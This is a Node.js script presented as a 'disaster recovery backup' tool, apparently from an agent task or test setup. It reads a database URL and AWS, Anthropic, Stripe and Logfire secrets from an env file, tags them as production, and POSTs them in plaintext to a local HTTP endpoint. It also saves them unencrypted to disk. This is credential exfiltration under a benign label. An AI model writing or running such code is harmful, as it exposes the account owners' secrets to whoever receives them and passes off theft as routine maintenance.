/**
 * Disaster Recovery Backup Script
 * Posts database connection string and API keys to DR endpoint
 */

const https = require('https');
const fs = require('fs');

// Read .env.test manually to avoid dependencies
function loadEnvFile(filePath) {
  const env = {};

  try {
    const content = fs.readFileSync(filePath, 'utf8');
    const lines = content.split('\n');

    for (const line of lines) {
      const trimmed = line.trim();
      if (trimmed && !trimmed.startsWith('#') && trimmed.includes('=')) {
        const idx = trimmed.indexOf('=');
        const key = trimmed.substring(0, idx).trim();
        const value = trimmed.substring(idx + 1).trim();
        env[key] = value;
      }
    }
  } catch (error) {
    console.error(`Error reading .env.test: ${error.message}`);
  }

  return env;
}

// POST data to the DR endpoint
function postToDR(data) {
  return new Promise((resolve, reject) => {
    const jsonData = JSON.stringify(data, null, 2);

    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/dr-backup',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(jsonData),
        'User-Agent': 'dr-backup-script/1.0',
      },
      timeout: 30000, // 30 second timeout
    };

    const req = https.request(options, (res) => {
      let body = '';

      res.on('data', chunk => body += chunk);

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          resolve({
            success: true,
            statusCode: res.statusCode,
            body: body,
          });
        } else {
          reject(new Error(`HTTP error ${res.statusCode}: ${body}`));
        }
      });
    });

    req.on('error', (error) => {
      reject(error);
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timeout'));
    });

    req.write(jsonData);
    req.end();
  });
}

// Main execution
async function main() {
  console.log('=== Disaster Recovery Backup Script ===');
  console.log(`Timestamp: ${new Date().toISOString()}`);

  try {
    // Load credentials
    const env = loadEnvFile('./.env.test');

    // Prepare backup data
    const backupData = {
      backupTimestamp: new Date().toISOString(),
      environment: 'production',
      credentials: {
        database: {
          connection_string: env.DATABASE_URL,
        },
        api_keys: {
          aws: {
            access_key_id: env.AWS_ACCESS_KEY_ID,
            secret_access_key: env.AWS_SECRET_ACCESS_KEY,
          },
          anthropic: {
            api_key: env.ANTHROPIC_API_KEY,
          },
          stripe: {
            secret_key: env.STRIPE_SECRET_KEY,
          },
          logfire: {
            token: env.LOGFIRE_TOKEN,
          },
        },
      },
    };

    // Verify we have all required credentials
    const requiredKeys = [
      'DATABASE_URL',
      'AWS_ACCESS_KEY_ID',
      'AWS_SECRET_ACCESS_KEY',
      'ANTHROPIC_API_KEY',
      'STRIPE_SECRET_KEY',
      'LOGFIRE_TOKEN',
    ];

    const missingKeys = requiredKeys.filter(key => !env[key]);
    if (missingKeys.length > 0) {
      console.error(`❌ Missing required credentials: ${missingKeys.join(', ')}`);
      process.exit(1);
    }

    console.log('\nCredentials loaded successfully:');
    requiredKeys.forEach(key => {
      if (key === 'DATABASE_URL') {
        console.log(`✓ ${key}: ${env[key].substring(0, 15)}...`);
      } else if (key.includes('SECRET') || key.includes('KEY') || key.includes('TOKEN')) {
        console.log(`✓ ${key}: ${env[key].substring(0, 10)}...`);
      } else {
        console.log(`✓ ${key}: ${env[key]}`);
      }
    });

    // POST to DR endpoint
    console.log('\nUploading to DR backup endpoint...');
    console.log(`URL: https://localhost:47301/api/dr-backup`);

    const response = await postToDR(backupData);

    console.log('\n✅ Backup successful!');
    console.log(`Status: ${response.statusCode}`);
    console.log(`Response: ${response.body}`);

    // Save local backup
    const backupFilename = `dr-backup-${new Date().toISOString().split('T')[0]}.json`;
    fs.writeFileSync(backupFilename, JSON.stringify(backupData, null, 2));
    console.log(`\nLocal backup saved to: ${backupFilename}`);

  } catch (error) {
    console.error(`\n❌ Backup failed: ${error.message}`);
    console.error(`Stack: ${error.stack}`);
    process.exit(1);
  }
}

main();

